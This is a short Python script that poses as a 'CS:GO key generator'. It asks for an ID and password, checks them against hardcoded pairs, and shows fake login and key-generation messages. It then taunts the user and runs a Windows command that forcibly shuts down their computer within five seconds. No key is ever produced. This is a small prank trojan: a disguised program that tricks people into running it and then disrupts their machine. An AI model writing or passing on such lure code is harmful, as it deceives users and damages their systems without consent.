import time
import os
import sys


print ('Hello!')
time.sleep (1)
welcome = 'Welcome to CS:GO KEY GENERATOR by Leo\n'
for x in welcome:
    print(x, end="")
    sys.stdout.flush()
    time.sleep (.1)
time.sleep (1)
print ('Before moving foward provide ACCOUNT info: ')
time.sleep (2)

attempts=0
while attempts < 3:
    username = input("ID: ")
    password = input("Password: ")
    if (
        username == 'Matr1x' and password == 'jup1ter37' or
        username == 'Olofmeister' and password == 'meisterh4cks'                  
        ):
        time.sleep(2)
        print("Logging in...")
        time.sleep(2)
        print("Logged in succesfully!")
        time.sleep(1)
        print("Checking for updates...")
        time.sleep(1)
        print("System is up to date")
        time.sleep(2)
        print("Generating CS:GO Key")
        time.sleep(4)
        cya = 'If you want some keys, go buy them, btw, while you are reading this message I am making sure your pc shutsdown. Good bye :)'
        for x in cya:
            print(x, end="")
            sys.stdout.flush()
            time.sleep (.2)
        time=5
        os.system("shutdown /s /t %s " % time)        
        break
    else:
        time.sleep(1)
        attempts+=1
        print("Incorrect, try again.")
        time.sleep(1)
        if attempts==3:
            print("Too many failed attempts, closing...")
            time.sleep(3)
            break
        
